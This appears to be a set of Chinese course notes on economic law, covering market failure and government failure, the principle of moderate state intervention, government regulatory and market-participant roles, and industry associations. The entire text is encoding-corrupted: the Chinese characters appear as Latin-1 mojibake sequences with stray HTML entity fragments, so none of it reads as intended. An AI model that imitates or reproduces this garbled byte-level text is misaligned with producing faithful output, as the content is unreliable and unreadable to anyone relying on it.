ç»æµæ³•ç»™è‡ªç”±æ”¾ä»»ä»¥é€‚å½“é™åˆ¶ï¼Œç»™æƒåˆ©æ»¥ç”¨ä»¥æ³•å¾‹åˆ¶çº¦ï¼Œåœ¨è‡ªç”±ä¸å¹²é¢„ä¹‹é—´è¾¾åˆ°å¹³è¡¡ï¼Œä¿è¯ç¤¾ä¼šç»æµçš„é¡ºåˆ©å‘å±•ã€‚ æ­¤å¤–ï¼Œç»æµæ³•é€šè¿‡æ‰“å‡»é™åˆ¶ç«äº‰ä¸ä¸æ­£å½“ç«äº‰è¡Œä¸ºï¼Œä»å®è§‚ä¸Šå¼•å¯¼å¸‚åœºç»æµå¥åº·å‘å±•ï¼Œå°†æ°‘æ³•åœ¨å¸‚åœºç»æµæ¡ä»¶ä¸‹è°ƒæ•´ç»æµå½¢æˆæ³•å¾‹ç©ºç™½åŠ ä»¥å¡«è¡¥ï¼Œæˆä¸ºå¸‚åœºç»æµçš„å®‰å…¨é˜€ã€‚   ç»æµæ³•ä¸è¡Œæ”¿æ³•  ä¼ ç»Ÿæ„ä¹‰ä¸Šï¼Œè¡Œæ”¿æ³•çš„ç«‹æ³•å®—æ—¨æ˜¯ï¼Œæ§åˆ¶è¡Œæ”¿æœºå…³æƒåŠ›è†¨èƒ€ï¼Œé˜²æ­¢è¡Œæ”¿æƒæ»¥ç”¨ï¼Œä¿æŠ¤ç›¸å¯¹äººã€‚ ç°ä»£ç¤¾ä¼šçš„è¡Œæ”¿æœºå…³è¢«èµ‹äºˆäº†æå¤§çš„ç»æµç®¡ç†æƒã€‚è¡Œæ”¿æœºå…³çš„ç»æµç®¡ç†è¡Œä¸ºç”±ç»æµè¡Œæ”¿æ³•è°ƒæ•´ã€‚    ç¬¬å››ç«  ç»æµæ³•åŸåˆ™ #  ç¬¬1èŠ‚ ç»æµæ³•åŸåˆ™æ¦‚è¿° #   å›½å®¶é€‚åº¦å¹²é¢„åŸåˆ™æ˜¯ç»æµæ³•çš„åŸºæœ¬åŸåˆ™  ç¬¬ä¸€ç¼–è¯¾å ‚ç¬”è®° #  DAY ONE #   äººç±»çš„åŸºæœ¬ç»æµé—®é¢˜ï¼šéœ€æ±‚æ— é™ä¸èµ„æºç¨€ç¼ºä¹‹é—´çš„çŸ›ç›¾ã€‚  DAY TWO #   ç»æµæ³•å¼ºè°ƒå›½å®¶é€‚åº¦å¹²é¢„å¸‚åœºï¼š(1)å‡¡æ˜¯å¸‚åœºèƒ½æ­£å¸¸è¿è¡Œï¼Œä¸éœ€è¦å¹²é¢„; (2)è‹¥å¹²é¢„å¸‚åœºçš„è¡Œæ”¿æˆæœ¬é«˜äºå¸‚åœºå¤±çµé€ æˆçš„æŸå¤±ï¼Œä¸å®æ–½å¹²é¢„ã€‚ å›½å®¶å¹²é¢„çš„ç›¸å¯¹æ€§åŸåˆ™ï¼š(1)åˆé€‚æ€§; (2)å¿…è¦æ€§; (3)ç¦æ­¢è¿‡åˆ†æ€§ã€‚  æ—¢è¦è­¦æƒ•å¸‚åœºå¤±çµï¼Œä¹Ÿè¦è­¦æƒ•æ”¿åºœå¤±çµ   ç»æµæ³•ä¸ç»æµå­¦ï¼š(1)ç»æµæ³•è¡¨è¿°ä»·å€¼åˆ¤æ–­; (2)ç»æµå­¦æè¿°å®¢è§‚è§„å¾‹ã€‚ ç»æµæ³•çš„èµ·æºï¼šæ³•å›½ï¼ˆæ³•å›½ç©ºæƒ³ä¸»ä¹‰è¯ç”Ÿç»æµæ³•çš„æ¦‚å¿µè™½æ— å®è·µæ„ä¹‰ï¼Œä½†æä¾›çš„å›½å®¶å¹²é¢„ç»æµçš„æ–¹å‘ï¼‰â†’å¾·å›½â†’æ—¥æœ¬â†’è‹è”â†’æ·å…‹æ–¯æ´›ä¼å…‹ï¼ˆç¬¬ä¸€éƒ¨ç»æµæ³•æ³•å…¸ï¼‰ å®Œå…¨å¸‚åœºç«äº‰ï¼šå½¢æˆä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š  å¸‚åœºä¸Šæœ‰ä¼—å¤šçš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ï¼Œä»»ä½•ä¸€ä¸ªç”Ÿäº§è€…æˆ–æ¶ˆè´¹è€…éƒ½ä¸èƒ½å½±å“å¸‚åœºä»·æ ¼ï¼› ä¼ä¸šç”Ÿäº§çš„äº§å“å…·æœ‰åŒè´¨æ€§ï¼Œä¸å­˜åœ¨å·®åˆ«ï¼› ç”Ÿäº§è€…è¿›å‡ºå¸‚åœºï¼Œä¸å—ç¤¾ä¼šåŠ›é‡çš„é™åˆ¶ï¼› å¸‚åœºäº¤æ˜“æ´»åŠ¨è‡ªç”±ã€å…¬å¼€ï¼Œæ²¡æœ‰äººä¸ºé™åˆ¶ï¼› å¸‚åœºä¿¡æ¯ç•…é€šå‡†ç¡®ï¼Œå¸‚åœºå‚ä¸è€…å……åˆ†äº†è§£å„ç§æƒ…å†µï¼ˆä¿¡æ¯å®Œå…¨å¯¹ç§°ï¼‰ï¼› å„ç§èµ„æºéƒ½èƒ½å……åˆ†æµåŠ¨ã€‚   å¸‚åœºå¤±çµï¼šé€šè¿‡å¸‚åœºé…ç½®èµ„æºä¸èƒ½å®ç°èµ„æºæœ€ä¼˜é…ç½®ã€‚å¸‚åœºå¤±çµçš„åŸå› ï¼š  å„æ–­; å¤–éƒ¨æ€§ï¼šæ­£å¤–éƒ¨æ€§ï¼ˆæŸä¸ªå‚å•†ç»™ä»–äººå¸¦æ¥çš„åˆ©ç›Šâ†’ç”Ÿäº§å‚å®¶ç¼ºä¹ç§¯ææ€§ï¼‰ï¼Œè´Ÿå¤–éƒ¨æ€§ï¼ˆæŸä¸ªå‚å•†æŸå¤±åˆ©ç›Šâ†’ç»™ç¤¾ä¼šå…¬å…±åˆ©ç›Šé€ æˆæŸå¤±ï¼‰ å…¬å…±ç‰©å“ã€‚å…¬å…±ç‰©å“æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š(1)ä¸å¯åˆ†å‰²ï¼Œå…±åŒå—ç›Šï¼Œå…±åŒæ¶ˆè´¹; (2)éæ’ä»–æ€§; (3)éç«äº‰æ€§; (4)éè¥åˆ©æ€§ã€‚è¿™å¯¼è‡´ï¼š  ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…ä¹‹é—´æ— æ­£å¸¸è”ç³»ï¼ŒæŠ•èµ„æ— ç§¯ææ€§ï¼Œä¾›åº”ä¸è¶³ï¼› å­˜åœ¨å…è´¹æˆä»½ï¼Œå¯ä¸ä»˜ä»£ä»·å¾—å–å¾—ï¼› ç§ä¸»ä½“éš¾ä»¥æ»¡è¶³å›½å®¶è¦æ±‚ç›®æ ‡ï¼Œä¸èƒ½æˆ–ä¸æ„¿ç”Ÿäº§ï¼› ä¿¡æ¯ä¸å¯¹ç§°ä¼šå¯¼è‡´å¸‚åœºå¤±çµâ†’æ¬¡å“å……æ–¥å¸‚åœº æˆ– é“å¾·é£é™©     æ”¿åºœå¤±çµçš„åŸå› ï¼šä¿¡æ¯å¤±çµï¼Œç›®æ ‡é€‰æ‹©å¤±è¯¯ï¼Œç®¡ç†å¤±æ§ã€‚  DAY THREE #   èµ„æœ¬ä¸»ä¹‰æ—¶æœŸçš„ç»æµæ³•äº§ç”ŸèƒŒæ™¯ï¼š  (1)å…‹æœå¸‚åœºç¼ºé™·éœ€è¦ç»æµæ³•; (2)å…‹æœæ”¿åºœå¤±çµéœ€è¦ç»æµæ³•ã€‚ å›½å®¶èŒèƒ½çš„å››é˜¶æ®µï¼šä¿æŠ¤é˜¶æ®µâ†’å¹²é¢„é˜¶æ®µï¼ˆå‡¯æ©æ–¯ï¼šå›½å®¶å¹²é¢„ç»æµï¼›äºšå½“Â·æ–¯å¯†ï¼šè‡ªç”±ç«äº‰ï¼‰â†’å‚ä¸é˜¶æ®µï¼ˆä»¥ç†æƒ³æ€»èµ„æœ¬å®¶çš„èº«ä»½ï¼‰â†’è°ƒæ§é˜¶æ®µã€‚   ç»æµæ³•å‘å±•é˜¶æ®µï¼šå‰èµ„æœ¬ä¸»ä¹‰å›½å®¶ç»æµæ³•â†’èµ„æœ¬ä¸»ä¹‰å›½å®¶ç»æµæ³•â†’ç¤¾ä¼šä¸»ä¹‰ç»æµæ³• ç½—æ–¯ç¦æ–°æ”¿é€šè¿‡ç»æµç«‹æ³•ï¼Œæ ‡å¿—ç»æµæ³•æˆä¸ºç‹¬ç«‹æ³•å¾‹éƒ¨é—¨  DAY FOUR #   ç»æµæ³•çš„åŸºæœ¬åŸåˆ™ï¼š  åŸºæœ¬åŸåˆ™ä¸»è¦åŒ…æ‹¬ç»æµæ³•ä¸»ä½“åˆ©ç›Šåè°ƒåŸåˆ™ã€å›½å®¶åè°ƒæœ¬å›½ç»æµè¿è¡Œæ³•å®šåŸåˆ™ è¡¥å……1ï¼šç»æµæ³•ç¤¾ä¼šæœ¬ä½åŸåˆ™; è¡¥å……2ï¼šä¿ƒè¿›å¸‚åœºæ•ˆç‡åŸåˆ™ï¼š(1)ç»´æŠ¤å…¬å¹³ç«äº‰åŸåˆ™; (2)ä»¥ä¼ä¸šæ”¿ç­–ä¿ƒè¿›ä¼ä¸šå¢é•¿; (3)ä¿éšœå¸‚åœºç«äº‰æœºåˆ¶ä¸ä¼ä¸šæœºåˆ¶ååŒè¿è¡Œã€‚   ç»æµæ³•ä½“ç³»ï¼šåŒ…æ‹¬å¸‚åœºç›‘ç®¡æ³•å’Œå®è§‚è°ƒæ§æ³• ç»æµæ³•æ˜¯ç»æµå‘å±•åˆ°ä¸€å®šé˜¶æ®µçš„å¿…ç„¶äº§ç‰© â€œæ”¿åºœ\u0026ndash;ç¤¾ä¼šä¸­é—´å±‚\u0026ndash;å¸‚åœºâ€æ¡†æ¶ï¼š  å¸‚åœºä¸»ä½“ï¼šç”Ÿäº§è€…ï¼ŒæŠ•èµ„è€…ï¼ŒåŠ³åŠ¨è€…ï¼Œæ¶ˆè´¹è€… ç¤¾ä¼šä¸­é—´å±‚ä¸»ä½“ï¼šç‹¬ç«‹äºæ”¿åºœä¸»ä½“ä¸å¸‚åœºä¸»ä½“ï¼Œä¸ºæ”¿åºœå¹²é¢„å¸‚åœºã€å¸‚åœºå½±å“æ”¿åºœå’Œå¸‚åœºä¸»ä½“ä¹‹é—´ç›¸äº’è”ç³»èµ·ä¸­ä»‹ä½œç”¨çš„ä¸»ä½“ã€‚  ç¤¾ä¼šå›¢ä½“ä¸å¾—ä»¥è¥åˆ©ä¸ºç›®çš„ è¡Œä¸šåä¼šï¼šä¸ºè¾¾åˆ°è¡Œä¸šå…±åŒåˆ©ç›Šçš„éè¥åˆ©æ€§è‡ªå‘æ€§ç»„ç»‡ã€‚å¯ä»¥æœ‰ç§æ³•äººã€‚ è¡Œä¸šåä¼šçš„è‡ªæ²»æƒæ˜¯æ”¿åºœç›‘ç®¡ä¸‹çš„ç¤¾ä¼šæƒåˆ©ã€‚æƒåŠ›æ¥æºï¼š(1)æ³•å¾‹æˆæƒ; (2)ä¼šå‘˜çš„è®©æ­¥ï¼ˆå¥‘çº¦äº§ç”Ÿï¼‰; (3)è¡Œæ”¿æˆæƒã€‚     åŠ¨æ€ç¤¾ä¼šå¥‘çº¦ï¼šç”±äºäººä»¬å¯¹æœ€åˆç¤¾ä¼šå¥‘çº¦ä¸æ»¡è€Œå°†æ”¿åºœæƒåŠ›è®©æ¸¡ã€‚  ç¬¬äº”ç«  æ”¿åºœç»æµèŒèƒ½æ³• #  ç¬¬1èŠ‚ æ¦‚è¿° #   æ”¿åºœä¸å¸‚åœºçš„å…³ç³»ä¸»è¦ç»å†äº†ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š  è‡ªç”±å¸‚åœºæ”¾ä»»â†’æ— ä¸ºä¹‹æ‰‹ã€‚20ä¸–çºª30å¹´ä»£ä»¥å‰ï¼Œæ”¿åºœèŒèƒ½ç†è®ºå—äºšå½“Â·æ–¯å¯†çš„å¤å…¸ç»æµè‡ªç”±ä¸»ä¹‰ç†è®ºçš„æ”¯é…ï¼Œæ™®éæ¨å´‡è‡ªç”±æ”¾ä»»çš„ç»æµæ”¿ç­–ã€‚ æ”¿åºœå…¬æƒåŠ›å¼€å§‹å¹²é¢„â†’æ‰¶æŒä¹‹æ‰‹ã€‚ä»¥ç¦åˆ©ç»æµå­¦ä¸ºç†è®ºåŸºç¡€ï¼Œæ”¿åºœä½œä¸ºç›‘ç®¡è€…ä¸ºå…¬å…±åˆ©ç›Šè€Œå¹²é¢„ç»æµï¼Œå……å½“å¸‚åœºçš„â€œè£åˆ¤å‘˜â€ï¼Œæ¯”å¦‚å®æ–½å®è§‚è°ƒæ§ã€è¿›è¡Œç»æµè°ƒèŠ‚å’Œç»æµç›‘ç®¡ã€‚ æ”¿åºœå…¬æƒåŠ›å…¨é¢å¹²é¢„â†’æ å¤ºä¹‹æ‰‹ã€‚æ”¿åºœä½œä¸ºå¸‚åœºçš„â€œå‚ä¸è€…â€ï¼Œä»¥æ™®é€šå¸‚åœºä¸»ä½“çš„èº«ä»½å‚ä¸å¸‚åœºç«äº‰æ¥å®ç°å…¶ç»æµèŒèƒ½ã€‚   æ”¿åºœç»æµèŒèƒ½ï¼šæ”¿åºœè¡Œä¸ºå¯¹ç»æµè¿è¡Œäº§ç”Ÿçš„å„ç§å½±å“çš„æ€»ç§°ã€‚  åˆ†ç±»ï¼šæ”¿åºœä½œä¸º(1)ç¤¾ä¼šç®¡ç†è€…; (2)å®è§‚ç»æµè°ƒæ§è€…; (3)å›½æœ‰èµ„äº§æ‰€æœ‰è€… æ‰€å…·æœ‰çš„èŒèƒ½ã€‚ èŒèƒ½ä¸»ä½“çš„ç‰¹å¾ï¼š(1)æ¦‚å¿µå¤–å»¶çš„ç‹­ä¹‰æ€§; (2)æ‰€æ¶‰äº‹åŠ¡çš„ç»æµæ€§; (3)ä¸»ä½“èº«ä»½çš„åŒé‡æ€§; (4)æƒèƒ½ä¸èŒƒå›´ç›¸å¯¹åº”ã€‚    ç¬¬2èŠ‚ æ”¿åºœçš„å¸‚åœºç›‘ç®¡è€…è§’è‰² #   ç®¡ç†ä¸ç›‘ç£çš„åŒºåˆ«  ç†å¿µä¸åŒã€‚â€œç®¡ç†è€…â€ä¸»è§‚ä¸Šæœ‰å¼ºçƒˆçš„æ§åˆ¶æˆ–ç®¡åˆ¶ç›¸å¯¹æ–¹çš„æ¬²æœ›æˆ–æ„æ„¿ã€‚ æ–¹å¼ä¸åŒã€‚ç®¡ç†ä¹ æƒ¯ç”¨ç›´æ¥ã€å¼ºè¡Œæ€§çš„è¡Œæ”¿æ‰‹æ®µå®æ–½ç»æµç›‘ç®¡èŒèƒ½ï¼›ç›‘ç£åˆ™æ„¿æ„ä½¿ç”¨é—´æ¥ã€åè‡ªå¾‹çš„æ³•æ²»æ‰‹æ®µå½¢å¼ç»æµç®¡ç†èŒæƒ è·¯å¾„ä¸åŒã€‚ç®¡ç†é‡‡ç”¨è‡ªä¸Šè€Œä¸‹çš„æ²»ç†æœºåˆ¶ï¼Œç›‘ç®¡é‡‡ç”¨è‡ªä¸‹è€Œä¸Šã€å…ˆç«‹è§„çŸ©å†æœ‰å®è·µã€‚   ç»æµç›‘ç®¡æƒç‰¹å¾ï¼šæ¥æºæ³•å®šæ€§ï¼Œå†…å®¹ä¸“å±æ€§ï¼Œæƒè´£éå¤„åˆ†æ€§ï¼ˆä¸å¾—æŠ›å¼ƒè®©æ¸¡ï¼‰ï¼Œå¸‚åœºçº¦æŸæ€§ï¼ˆä»¥ä¸ç ´åå¸‚åœºæœºåˆ¶çš„æ­£å¸¸å‘æŒ¥ä¸ºå‰æï¼‰ã€‚ ç»æµç›‘ç®¡æƒå†…å®¹ï¼š  å®è§‚è°ƒæ§æƒï¼šä¸­å¤®ç»æµç›‘ç®¡æœºå…³å’Œçœçº§ç»æµç›‘ç®¡æœºå…³ï¼Œå¯¹å›½æ°‘ç»æµå’Œç¤¾ä¼šå‘å±•ç›®æ ‡çš„å†³ç­–æƒåŠ›ï¼Œä»¥åŠåœ¨å›½æ°‘ç»æµä¸ç¤¾ä¼šå‘å±•è®¡åˆ’çš„å®æ–½è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨å„ç§æ‰‹æ®µä»å®è§‚ä¸Šå¯¹å›½æ°‘ç»æµå®æ–½è°ƒèŠ‚çš„æƒåŠ›ã€‚ å¸‚åœºç®¡ç†æƒï¼šæŒ‡å›½å®¶ç›‘ç®¡æœºå…³ä¾æ³•å¯¹å¸‚åœºæ´»åŠ¨ä¸»ä½“çš„å¸‚åœºç»è¥è¡Œä¸ºäº«æœ‰è®¸å¯ã€å®¡æ‰¹ã€å†³å®šç­‰èŒæƒã€‚ ç»æµç›‘ç£æƒï¼šæŒ‡æœ‰å…³å›½å®¶æœºå…³å¯¹å›½æ°‘ç»æµæ´»åŠ¨è¿›è¡Œç›‘å¯Ÿç£å¯¼çš„æƒåŠ›ã€‚  å…·ä½“çš„åŒ…æ‹¬æœ‰å›½å®¶çš„è®¡åˆ’ç›‘ç£ã€è´¢æ”¿ç›‘ç£ã€å®¡è®¡ç›‘ç£ã€ä¼šè®¡ç›‘ç£ã€é“¶è¡Œç›‘ç£ç­‰ã€‚     ç»æµç›‘ç®¡æƒçš„å®æ–½åŠæ³•ï¼š  å‡†å…¥ç›‘ç®¡ï¼šåˆç§°å¸‚åœºå‡†å…¥ç›‘ç®¡ï¼Œæ˜¯æŒ‡å…¶ä»–å¸‚åœºå¦‚è¦è¿›å…¥å¸‚åœºä¸»ä½“è¿›è¡Œç»æµæ´»åŠ¨æˆ–å‚ä¸ç«äº‰ï¼Œå¿…é¡»å…ˆå¾—åˆ°æ”¿åºœå¸‚åœºä¸»ä½“çš„æ ¸å‡†æˆ–è®¸å¯ï¼Œå¦åˆ™å°±ä¸äº«æœ‰åˆæ³•çš„å¸‚åœºä¸»ä½“ä»¥åŠå…¶è¿è¥èµ„æ ¼ã€‚ é€€å‡ºç›‘ç®¡ï¼šåˆç§°å¸‚åœºé€€å‡ºç›‘ç®¡ï¼Œæ˜¯æŒ‡æ”¿åºœä¸»ä½“é€šè¿‡åˆ¶å®šè§„åˆ™ã€æ‰§è¡Œæ³•ä»¤å’Œå¸æ³•æ•‘æµç­‰æ–¹å¼å¼ºåˆ¶æ€§ä»¤å…¶ä»–å¸‚åœºä¸»ä½“åœæ­¢æŸäº›ç»æµæ´»åŠ¨æˆ–é€€å‡ºæŸäº›å¸‚åœºé¢†åŸŸç›‘ç®¡æªæ–½æˆ–è¡Œä¸ºã€‚  å¸¸ç”¨æ‰‹æ®µï¼šç¦æ­¢ã€å‘½ä»¤ã€å¤„ç½š   è¿è¥ç›‘ç®¡ï¼š  ä»·æ ¼è´¹ç‡ç›‘ç®¡ï¼šåˆç§°å¸‚åœºè¿è¡Œä»·æ ¼å’Œè´¹ç‡ç›‘ç®¡ï¼Œæ˜¯æ”¿åºœè¿›è¡Œå¸‚åœºå¹²é¢„çš„æœ€é‡è¦çš„å½¢å¼å’Œæœ€ç›´æ¥çš„æ‰‹æ®µï¼Œæ˜¯æŒ‡å¯¹è·æ‰¹è¿›å…¥å¸‚åœºçš„æ´»åŠ¨ä¸»ä½“ æ‰€ç”Ÿäº§çš„å•†å“å’Œæä¾›çš„æœåŠ¡ çš„ä»·æ ¼æ°´å¹³å’Œä»·æ ¼ç»“æ„è¿›è¡Œçš„ç›‘ç£ä¸ç®¡ç†ã€‚ æ ‡å‡†æ§åˆ¶ç›‘ç®¡ï¼šæŒ‡æ”¿åºœç›‘ç®¡ä¸»ä½“ä»·æ ¼æœºåˆ¶è¿ç”¨ç»æµå­¦ å¯¹äº§å“ç»“æ„ã€è§„æ ¼ã€æŠ€æœ¯ã€è´¨é‡å’Œæ£€éªŒæ–¹æ³•ç­‰æ ‡å‡†æ‰€ä½œçš„è§„å®šåŠç›‘ç®¡è¡Œä¸ºã€‚  äº§å“æ ‡å‡†ï¼šå¯¹äº§å“æœ¬èº«çš„ç‰¹æ€§æå‡ºçš„è¦æ±‚ï¼›æŠ€æœ¯æ ‡å‡†ï¼šå¯¹ç”Ÿäº§ç¨‹åºæˆ–è¿‡ç¨‹æå‡ºçš„è¦æ±‚ã€‚   ä¿¡æ¯æŠ«éœ²ç›‘ç®¡ï¼šæ˜¯æŒ‡æ”¿åºœç›‘ç®¡ä¸»ä½“è¿ç”¨ç»æµå­¦ä¹‹ä¿¡æ¯ä¸å¯¹ç§°å¯¼è‡´ä»·æ ¼æœºåˆ¶æ‰­æ›²å’Œå¸‚åœºåˆ©ç›Šç›¸å…³è€…æƒç›Šå¸¸è¢«ä¾µå®³çš„ç†è®ºï¼Œä¾æ®å…¬å¼€ã€å…¬å¹³å’Œå…¬æ­£çš„åŸåˆ™ï¼Œè¦æ±‚å…¶ä»–å¸‚åœºä¸»ä½“å¯¹å…¶äº§å“ã€æœåŠ¡å’Œç»è¥ç®¡ç†ä¸è´¢åŠ¡æ–°ä¿¡æ¯å…¬ä¹‹äºä¼—çš„ç›‘ç®¡æªæ–½å’Œè¡Œä¸ºã€‚ æ¿€åŠ±ç›‘ç®¡ï¼šæŒ‡æ”¿åºœå¸‚åœºç›‘ç®¡ä¸»ä½“é€šè¿‡åˆ¶å®šç›¸å…³æ”¿ç­–æˆ–æ³•å¾‹ æ¥é¼“åŠ±æˆ–æ¿€åŠ±å…¶ä»–å¸‚åœºä¸»ä½“ä¹‹å¸‚åœºå‡†å…¥ã€å¸‚åœºè¿è¥ç®¡ç†å’Œæƒç›Šåˆ†é…ç­‰æ´»åŠ¨çš„ç›‘ç®¡è¡Œä¸ºæˆ–æªæ–½ã€‚     æ”¿åºœç›‘ç®¡åŸºæœ¬åŸåˆ™ï¼š(1)å¸‚åœºä¼˜å…ˆåŸåˆ™; (2)é€‚åº¦å¹²é¢„åŸåˆ™; (3)ä¾æ³•å¹²é¢„åŸåˆ™; (4)æˆæœ¬æ”¶ç›ŠåŸåˆ™.  ç¬¬3èŠ‚ æ”¿åºœçš„å¸‚åœºå‚ä¸è€…è§’è‰² #   æ”¿åºœå‚ä¸å¸‚åœºçš„é€”å¾„ï¼š  æŠ•èµ„èèµ„ï¼šæ”¿åºœæŠ•èµ„å’Œèèµ„æ´»åŠ¨æ˜¯å›½å®¶æˆ–æ”¿åºœå‚ä¸å¸‚åœºç»æµæ´»åŠ¨æ¥è¾¾åˆ°å®è§‚è°ƒæ§ç›®çš„çš„å¿…è¦æ‰‹æ®µï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š  å›½å®¶æˆ–æ”¿åºœä»¥è´¢æ”¿èµ„é‡‘å¹¶ä»¥ç‰¹æ®Šæ–¹å¼æˆ–è½½ä½“è¿›è¡ŒæŠ•èèµ„ï¼ˆæ¯”å¦‚å‘è¡Œä¸»æƒå›½å®¶å€ºåŠ¡ï¼‰ å›½å®¶æˆ–æ”¿åºœæˆç«‹ã€ç»„ç»‡æˆ–å§”æ‰˜ä¼ä¸šå½¢æ€æˆ–éä¼ä¸šå½¢æ€çš„ç»æµå®ä½“è¿›è¡ŒæŠ•èèµ„çš„æ´»åŠ¨ï¼ˆæ¯”å¦‚ä¸­çŸ³æ²¹ç­‰å¤§å‹å›½æœ‰ç‹¬èµ„æˆ–æ§è‚¡ä¼ä¸šçš„æŠ•èèµ„è¡Œä¸ºï¼‰   ç»ç®¡ä¼ä¸šï¼šä½œä¸ºå¸‚åœºä¸»ä½“çš„æ”¿åºœäº²è‡ªå‚ä¸ç‰¹æ®Šä¼ä¸šæˆ–ç«äº‰æ€§ä¼ä¸šçš„ç»è¥ä¸ç®¡ç†è¡Œä¸ºçš„ç®€ç§°ã€‚ ä¸“è¥è´¸æ˜“ï¼šæ”¿åºœä½œä¸ºå¸‚åœºä¸»ä½“åˆ©ç”¨å…¶ç‰¹æ®Šèº«ä»½åŠèŒæƒï¼Œä¸“é—¨æˆ–å„æ–­ä»äº‹ä¹°å–æˆ–äº¤æ˜“è¡Œä¸ºã€‚ ç»è¥åŸå¸‚ï¼šåŸå¸‚æ”¿åºœè¿ç”¨å¸‚åœºæœºåˆ¶è¿›è¡Œç»è¥æ´»åŠ¨ï¼Œä»¥æ­¤æ¥è°ƒæ§åŸå¸‚å‘å±•ç›®æ ‡ä¸æœ‰é™   æ”¿åºœå‚ä¸å¸‚åœºçš„åŸåˆ™ï¼š(1)å‚ä¸ç›®çš„çš„å…¬æ­£æ€§; (2)å‚ä¸èŒƒå›´çš„æœ‰é™æ€§; (3)ä¸»ä½“èº«ä»½çš„å¹³ç­‰æ€§; (4)å‚ä¸æ–¹å¼çš„å…¬å¼€æ€§ã€‚ å°½ç®¡æ´›å…‹æŒ‡å‡ºæ”¿åºœçš„äº§ç”Ÿæ˜¯åŸºäºå…¬æ°‘æƒçš„è®©æ¸¡ï¼Œå› è€Œæ”¿åºœå¤©ç”Ÿå°±åº”è¯¥å…³æ³¨äººç±»æ•´ä½“åˆ©ç›Šã€‚ä½†ç°ä»£ç»æµå­¦å®¶è®¤ä¸ºæ”¿åºœæœ€å¤§åŒ–è¿½æ±‚è‡ªå·±åˆ©ç›Šä¹Ÿæ˜¯æ”¿åºœçš„åŸºæœ¬å±æ€§ã€‚è‡ªåˆ©æ€§å’Œå…¬å…±æ€§çš„åŒæ—¶å­˜åœ¨ï¼Œä¼šå‘ç”Ÿæ”¿åºœâ€œç»æµäººâ€æœ‰é™ç†æ€§é—®é¢˜ï¼š  æ”¿åºœâ€œç»æµäººâ€æœ‰é™ç†æ€§è¡¨ç°ä¹‹ä¸€ï¼šæ”¿åºœä¸æ°‘äº‰åˆ©ï¼šå¯¹ç¤¾ä¼šèµ„æœ¬çš„æŠ•èµ„äº§ç”ŸæŒ¤å‡ºæ•ˆåº”ï¼Œå› è€Œæ”¿åºœä»ä¸­è·å¾—é«˜é¢è´¢æ”¿æ”¶å…¥å’Œå„æ–­åˆ©æ¶¦ã€‚ æ”¿åºœâ€œç»æµäººâ€æœ‰é™ç†æ€§è¡¨ç°ä¹‹äºŒï¼šç ´åå¸‚åœºç«äº‰ï¼šæ”¿åºœè‡ªåˆ©æ€§æå®¹æ˜“ç ´åå¸‚åœºç«äº‰å¹¶æ‰°ä¹±å¸‚åœºç§©åºã€‚ æ”¿åºœâ€œç»æµäººâ€æœ‰é™ç†æ€§è¡¨ç°ä¹‹ä¸‰ï¼šæƒåŠ›å¯»ç§Ÿä¸¥é‡ï¼šæ”¿åºœå®˜å‘˜è‡ªåˆ©æ€§æˆ–æ”¿åºœåˆ©ç›Šé›†å›¢çš„è‡ªè‚¥è¡Œä¸ºã€‚ æ”¿åºœâ€œç»æµäººâ€æœ‰é™ç†æ€§è¡¨ç°ä¹‹å››ï¼šèŒèƒ½éƒ¨é—¨çŸ›ç›¾ï¼šæ”¿åºœèŒèƒ½éƒ¨é—¨åœ¨å……å½“å…¬å…±åˆ©ç›Šä»£è¡¨è€…çš„åŒæ—¶ï¼Œä½œä¸ºå•ä½ã€éƒ¨é—¨åˆ©ç›Šä»£è¡¨è€…çš„è§’è‰²ä¹Ÿä¸æ–­æ˜¾éœ²ã€‚   æ”¿åºœå‚ä¸å¸‚åœºé—®é¢˜çš„è§£å†³ï¼š  é¿å…åŒé‡è§’è‰²é”™ä½ï¼šç›‘ç®¡åŠŸèƒ½å’Œç»æµåŠŸèƒ½åˆ†ç½®ä»¥åŠç§æƒåˆ©ä¸å…¬æƒåŠ›è¾¹ç•Œæ¸…æ™°æ˜¯æ³•å¾‹åˆ¶åº¦æ„å»ºçš„é‡ç‚¹ã€‚ æœ‰æ‰€ä¸ºä¸æœ‰æ‰€ä¸ä¸ºï¼šå¤„ç†å¥½æˆ–å®šä½æ¸…æ¥šæ”¿åºœå…¬æƒåŠ›ç§åŒ–åçš„æƒåˆ©è¾¹ç•Œã€‚ è¥åˆ©æ€§ä¸éè¥åˆ©æ€§ã€‚    ç¬¬å…­ç«  è¡Œä¸šåä¼šæ³• #  ç¬¬1èŠ‚ è¡Œä¸šåä¼šæ³•æ¦‚è¿° #   è¡Œä¸šåä¼šï¼šæ˜¯æŒ‡ä¸ºäº†è¾¾åˆ°å…±åŒåˆ©ç›Šç›®æ ‡ç»„ç»‡èµ·æ¥çš„ç”±ä¼šå‘˜å‚ä¸çš„ ä¸€ç§éè¥åˆ©æ€§çš„éæ”¿åºœæ€§çš„è‡ªå¾‹æ€§çš„ ç¤¾ä¼šç»„ç»‡ã€‚  æˆ‘å›½ç›®å‰å°šæ— ã€Šè¡Œä¸šåä¼šæ³•ã€‹æˆ–è€…ç±»ä¼¼çš„æ³•å¾‹ï¼Œä¸»è¦æ ¹æ®ã€Šç¤¾ä¼šå›¢ä½“ç™»è®°ç®¡ç†æ¡ä¾‹ã€‹ç­‰æ³•å¾‹ã€‚   è¡Œä¸šåä¼šçš„ç‰¹ç‚¹ï¼š(1)éè¥åˆ©æ€§; (2)éæ”¿åºœæ€§; (3)ä¸­ä»‹æ€§; (4)äº’ç›Šæ€§ã€‚  ä¸­ä»‹æ€§ï¼šè¡Œä¸šåä¼šä»‹äºæ”¿åºœå’Œå¸‚åœºä¸»ä½“ä¹‹é—´ï¼Œåœ¨æ²Ÿé€šæ”¿åºœä¸ä¼ä¸šå…³ç³»ä¸Šèµ·ç€æ‰¿ä¸Šå¯ä¸‹çš„æ¡¥æ¢å’Œçº½å¸¦ä½œç”¨ã€‚ 